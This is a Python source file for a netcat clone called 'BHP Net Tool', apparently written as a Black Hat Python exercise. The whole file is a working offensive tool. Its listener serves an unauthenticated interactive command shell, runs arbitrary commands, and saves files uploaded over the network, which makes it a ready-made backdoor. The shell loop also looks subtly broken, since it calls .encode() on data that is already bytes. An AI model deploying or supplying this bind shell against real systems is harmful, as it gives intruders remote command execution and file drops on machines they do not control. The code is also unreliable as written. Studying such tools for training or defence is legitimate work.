import argparse
import cmd
import socket
import shlex
import subprocess
import sys
import threading
import textwrap

def execute(cmd):
    cmd = shlex.split(cmd)
    if not cmd:
        return
    proc = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    stdout_data = proc.communicate()[0]
    return stdout_data
class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit(0)

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))        
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle,
                args=(client_socket,)
            )
            client_thread.start()

    def handle(self, client_socket):
        if self.args.execute:
            response = execute(self.args.execute)
            client_socket.send(response)
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                        break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
                message = f'Saved file {self.args.upload}'
                client_socket.send(message.encode())
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(1024)
                    response = execute(cmd_buffer.decode())
                    if len(response) > 0:
                        client_socket.send(response.encode())
                        cmd_buffer = b''
                except Exception as e:
                    print(f'Server killed : {e}')
                    client_socket.close()
                    sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="BHP Net Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
            Examples:
            netcat.py -t 237.84.2.178 -p 5555 -l -c "id"
            netcat.py -t 237.84.2.178 -p 5555 -l -u myscript.py
            echo "ABC" | netcat.py -t 237.84.2.178 -p 5555
            netcat.py -t 237.84.2.178 -p 5555       
            """)
    )    
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', type=str, help='execute file')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='port to listen on')
    parser.add_argument('-t', '--target', type=str, default='89.0.142.86', help='target ip / host')  
    parser.add_argument('-u', '--upload', type=str, help='upload file')  
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    nc = NetCat(args, buffer.encode())
    nc.run()
